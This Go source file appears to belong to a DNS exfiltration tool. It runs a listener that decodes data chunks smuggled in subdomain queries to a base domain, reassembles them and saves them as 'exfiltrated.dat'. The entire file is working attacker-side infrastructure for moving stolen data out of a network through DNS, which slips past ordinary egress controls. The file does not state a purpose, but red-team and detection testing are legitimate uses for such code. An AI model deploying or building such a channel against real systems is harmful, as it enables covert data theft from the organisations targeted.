package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"sort"
	"sync"
	"syscall"

	"github.com/afterdarksys/godnshole/pkg/dnsencoder"
	"github.com/miekg/dns"
)

type ExfilSession struct {
	chunks map[int][]byte
	mu     sync.Mutex
}

func NewExfilSession() *ExfilSession {
	return &ExfilSession{
		chunks: make(map[int][]byte),
	}
}

func (s *ExfilSession) AddChunk(seq int, data []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.chunks[seq] = data
}

func (s *ExfilSession) Reconstruct() []byte {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Sort by sequence number
	var seqs []int
	for seq := range s.chunks {
		seqs = append(seqs, seq)
	}
	sort.Ints(seqs)

	// Concatenate chunks
	var result []byte
	for _, seq := range seqs {
		result = append(result, s.chunks[seq]...)
	}

	return result
}

func main() {
	domain := flag.String("domain", "exfil.example.com", "Base domain to listen for")
	port := flag.Int("port", 5353, "DNS server port (use 53 for production, requires root)")
	output := flag.String("output", "exfiltrated.dat", "Output file for exfiltrated data")
	encoding := flag.String("encoding", "base32", "Encoding type (base32 or dictionary)")
	flag.Parse()

	var decoder interface {
		DecodeFromSubdomain(string) ([]byte, int, error)
	}
	if *encoding == "dictionary" {
		decoder = dnsencoder.NewDictionaryEncoder(*domain)
	} else {
		decoder = dnsencoder.NewEncoder(*domain)
	}

	session := NewExfilSession()

	dns.HandleFunc(*domain, func(w dns.ResponseWriter, r *dns.Msg) {
		m := new(dns.Msg)
		m.SetReply(r)

		for _, q := range r.Question {
			log.Printf("Received query: %s", q.Name)

			data, seq, err := decoder.DecodeFromSubdomain(q.Name)
			if err != nil {
				log.Printf("  Failed to decode: %v", err)
				continue
			}

			log.Printf("  Decoded chunk %d: %d bytes", seq, len(data))
			session.AddChunk(seq, data)

			// Send NXDOMAIN response (data received but domain doesn't exist)
			m.SetRcode(r, dns.RcodeNameError)
		}

		w.WriteMsg(m)
	})

	server := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "udp"}
	log.Printf("Starting DNS exfiltration server on port %d", *port)
	log.Printf("Listening for domain: %s", *domain)
	log.Printf("Output will be saved to: %s", *output)
	log.Println("Press Ctrl+C to stop and save exfiltrated data.")

	// Wait for shutdown signal
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)

	// Start server in goroutine
	go func() {
		if err := server.ListenAndServe(); err != nil {
			log.Printf("Server error: %v", err)
		}
	}()

	<-sig

	log.Println("Shutting down...")
	server.Shutdown()

	// Save exfiltrated data
	data := session.Reconstruct()
	if len(data) > 0 {
		if err := os.WriteFile(*output, data, 0644); err != nil {
			log.Fatalf("Failed to write output: %v", err)
		}
		log.Printf("Saved %d bytes to %s", len(data), *output)
	} else {
		log.Println("No data was exfiltrated")
	}
}
